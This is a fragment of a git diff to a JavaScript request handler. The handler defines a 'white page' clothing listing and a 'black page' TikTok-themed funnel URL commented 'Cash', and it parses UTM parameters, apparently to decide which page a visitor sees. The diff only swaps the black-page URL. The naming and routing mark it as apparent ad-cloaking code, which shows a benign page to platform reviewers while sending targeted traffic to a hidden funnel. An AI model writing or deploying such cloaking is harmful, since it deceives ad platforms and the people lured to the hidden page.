@@ -2,7 +2,7 @@ export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://xavemenmyshopifycom.creator-spring.com/listing/xaveman-clothing?product=636";
     // Cash
-    const blackPageURL = "https://YAbHewMyUM.myfunnelish.com/tiktok-vote123-third";
+    const blackPageURL = "https://YAbHewMyUM.myfunnelish.com/tiktok-vote123-second";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
